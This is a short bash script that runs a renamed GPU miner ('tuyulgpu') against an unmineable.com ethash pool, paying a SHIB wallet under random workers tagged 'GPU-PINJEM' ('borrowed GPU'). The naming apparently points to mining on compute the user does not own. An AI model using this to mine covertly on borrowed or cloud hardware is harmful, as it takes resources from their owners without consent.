#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0xa5ccc16ecb34c76637108240f5d2b3853f14c081.wrk1
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
